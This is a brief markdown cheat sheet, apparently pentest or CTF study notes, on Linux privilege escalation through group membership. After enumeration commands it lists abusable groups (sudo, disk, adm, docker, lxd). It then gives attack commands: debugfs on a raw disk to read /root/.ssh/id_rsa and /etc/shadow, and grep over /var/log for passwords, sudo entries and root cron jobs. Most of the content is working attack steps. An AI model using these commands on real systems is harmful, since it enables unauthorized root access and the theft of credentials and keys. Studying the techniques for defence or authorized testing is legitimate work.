- [ ] Enumerating Group Membership
- [ ] Interesting Groups

Enumerating Group Membership!!!
```sh
id
groups
groups <username>
getent group sudo
getent group <group_name>
```
Interesting Groups!!!
```sh
# 1-Groups With Sudo rights
sudo, admin, wheel
# 2-Disk
# 3-ADM
ls -la /var/log
# 4-Docker
# 5-lxd
```
Disk!!!
```sh
# enumerate
id
df -h
# read ssh keys | sensitives file (/etc/shadow)
debugfs /dev/sda3
mkdir test
cat /root/.ssh/id_rsa
cat /etc/shadow
```
ADM!!!
```sh
cd /var/log && ls -la /var/log
grep -iR password
grep -iR passw
grep 'sudo' auth.log
grep 'CRON' syslog | grep '(root)'
grep password apache2/access.log
```